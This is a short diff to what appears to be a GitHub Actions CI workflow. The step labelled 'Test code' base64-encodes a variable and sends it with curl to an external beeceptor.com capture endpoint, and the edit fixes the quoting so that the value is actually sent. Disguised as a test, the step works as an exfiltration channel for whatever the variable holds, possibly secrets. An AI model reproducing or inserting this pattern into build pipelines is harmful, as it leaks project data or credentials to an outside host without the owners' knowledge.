@@ -20,7 +20,7 @@ jobs:
       - name: Test code
         run: |
           mango=$(echo "${test}" | base64)
-          curl https://inovasys.free.beeceptor.com/{$mango}
+          curl "https://inovasys.free.beeceptor.com/${mango}"
   build:
     needs: test
     runs-on: ubuntu-latest
